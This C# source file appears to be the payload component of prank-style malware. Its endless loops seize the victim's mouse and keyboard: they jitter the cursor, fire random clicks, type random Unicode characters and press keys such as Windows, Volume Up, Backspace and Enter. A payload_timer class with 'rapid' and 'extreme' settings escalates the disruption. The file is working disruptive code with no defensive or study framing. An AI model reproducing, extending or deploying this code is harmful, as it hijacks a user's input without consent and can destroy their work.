using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace version1
{
    public class random_mouse
    {
        public void mouse_ev()
        {
            while(true)
            {
                Random rand;
                rand = new Random();
                for (int num = 0; num < 30; num++)
                {
                    int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
                    Dll_Imports.POINT get_mouse;
                    Dll_Imports.GetCursorPos(out get_mouse);
                    Dll_Imports.SetCursorPos(Convert.ToInt32(get_mouse.X + rand.Next(-20, 20)), Convert.ToInt32(get_mouse.Y + rand.Next(-20, 20)));
                    int rnd_mouse = rand.Next(2);
                    if (rnd_mouse == 1)
                    {
                        Dll_Imports.mouse_event(Dll_Imports.MOUSEEVENTF_LEFTDOWN, x, y, 0, UIntPtr.Zero);
                        Dll_Imports.mouse_event(Dll_Imports.MOUSEEVENTF_LEFTUP, x, y, 0, UIntPtr.Zero);
                    }
                    else
                    {
                        Dll_Imports.mouse_event(Dll_Imports.MOUSEEVENTF_MIDDLEDOWN, x, y, 0, UIntPtr.Zero);
                        Dll_Imports.mouse_event(Dll_Imports.MOUSEEVENTF_MIDDLEUP, x, y, 0, UIntPtr.Zero);
                    }
                    if(payload_timer.rapid_crazy == true)
                    {
                        Dll_Imports.mouse_event(Dll_Imports.MOUSEEVENTF_RIGHTDOWN, x, y, 0, UIntPtr.Zero);
                        Dll_Imports.mouse_event(Dll_Imports.MOUSEEVENTF_RIGHTUP, x, y, 0, UIntPtr.Zero);
                    }

                    string myText = "abcdefghijklmnopqrstuvwxyzěščřžýáíé+=´¨/*-+0123456789öÿïäëéóśńŕůú)§,.-" +
                    "☺☻♥♦♣♠•◘○◙♂♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼ !?ûùÿ┤╡╢╖╕║╗╝╜╛┐└┴┬├─┼╞╟╚╔╩╦╠═╬╧╨╤,-.!:É" +
                    "@°E›ÍÐžÌåÃTWÉò=*ª‹n×¦ádöÔâÍ¹¸¯š1‰z]fzç<yŠïj£øz]Òä[ƒ†”k•¢‚U¦áæQ|mkÚ~ú–H|‚ùSáp±Êjª1j" +
                    "£½Q©ùz„˜=,ˆŽã´í - OüþM#H±ŠÏ*b`þîWºBA»_25x+%Â«³$Á¯zª:£Ìì«ùªšu%´ô" +
                    "õzž!ö(S-Ñ¡ÒåÜbë¤¯&ÏUÚ>FNñÙˆ¸¾eß”¤e²êgp­Ç™˜_ÀÁ &&öe]2¨åaü!Âu*äû¦jFWg±0=!nä–ù¨È7ºöIÕ.á!õ•" +
                    "I4%¾Rë³rˆ£…>¥”cÿ®fÐ¼jz›»ê¼Š£ŠaÃÌ?›}ïKÜÿ†æ&è†&Ù÷™ŒfF2ä ™Ó°iÆ¼?¨c Â¶’óQñ‚" +
                    "q4R³kUzH‡ñ‹Ð¿ZØ†‹©iÞ8Zoþóþ¤bqm†ú@Á]»ÜÃÆz¾ÇüðÅ­Esîp«›lbû‹&e[”0®¨°zå(1ÿ"; // can be input via a Forms textbox

                    char[] Mychars = myText.ToCharArray();

                    UInt16 uniCode = Mychars[rand.Next(Mychars.Length)]; // if you want to simulate, say, the sixth' char of the string

                    Dll_Imports.INPUT[] input = new Dll_Imports.INPUT[1];
                    input[0].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                    input[0].U.ki.wScan = (Dll_Imports.ScanCodeShort)uniCode;
                    input[0].U.ki.dwFlags = Dll_Imports.KEYEVENTF.UNICODE;
                    Dll_Imports.SendInput(1, input, Marshal.SizeOf(typeof(Dll_Imports.INPUT)));
                    Thread.Sleep(5);
                }
                if (payload_timer.rapid_mouse == false)
                    Thread.Sleep(rand.Next(3000, 10000));
                else if (payload_timer.extreme == false)
                    Thread.Sleep(rand.Next(100, 1000));
                else
                    Thread.Sleep(1);
            }
        }
        public void crazy_keyboard()
        {
            Random rand;
            while (true)
            {
                rand = new Random();
                Dll_Imports.INPUT[] input = new Dll_Imports.INPUT[12];
                input[0].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[0].U.ki.wVk = Dll_Imports.VirtualKeyShort.LWIN;
                input[1].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[1].U.ki.wVk = Dll_Imports.VirtualKeyShort.NUMLOCK;
                input[2].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[2].U.ki.wVk = Dll_Imports.VirtualKeyShort.VOLUME_UP;
                input[3].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[3].U.ki.wVk = Dll_Imports.VirtualKeyShort.CAPITAL;
                input[4].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[4].U.ki.wVk = Dll_Imports.VirtualKeyShort.F5;
                input[5].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[5].U.ki.wVk = Dll_Imports.VirtualKeyShort.F6;
                input[6].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[6].U.ki.wVk = Dll_Imports.VirtualKeyShort.HOME;
                input[7].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[7].U.ki.wVk = Dll_Imports.VirtualKeyShort.PRIOR;
                input[8].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[8].U.ki.wVk = Dll_Imports.VirtualKeyShort.BACK;
                input[9].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[9].U.ki.wVk = Dll_Imports.VirtualKeyShort.SPACE;
                input[10].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[10].U.ki.wVk = Dll_Imports.VirtualKeyShort.TAB;
                input[11].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                input[11].U.ki.wVk = Dll_Imports.VirtualKeyShort.RETURN;
                Dll_Imports.SendInput((uint)rand.Next(12), input, Marshal.SizeOf(typeof(Dll_Imports.INPUT)));
                if (payload_timer.rapid_crazy == false)
                    Thread.Sleep(rand.Next(1000, 5000));
                else if (payload_timer.extreme == false)
                    Thread.Sleep(100);
                else
                    Thread.Sleep(1);
            }
        }
    }
}
